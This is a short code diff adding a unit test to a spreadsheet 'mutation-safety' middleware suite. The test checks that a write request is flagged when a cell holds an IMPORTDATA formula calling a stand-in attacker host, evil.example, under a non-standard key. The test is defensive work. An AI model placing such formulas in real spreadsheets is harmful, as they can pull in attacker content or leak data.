@@ -50,6 +50,19 @@ describe('mutation-safety-middleware', () => {
     expect(violation?.path).toContain('operations');
   });
 
+  it('detects dangerous formulas under non-standard keys', () => {
+    const violation = detectMutationSafetyViolation({
+      request: {
+        action: 'write',
+        spreadsheetId: 'sheet-1',
+        rows: [{ cells: [{ content: '=IMPORTDATA("https://evil.example/data.csv")' }] }],
+      },
+    });
+
+    expect(violation).not.toBeNull();
+    expect(violation?.path).toContain('request.rows');
+  });
+
   it('returns null for non-mutation actions', () => {
     const violation = detectMutationSafetyViolation({
       request: {
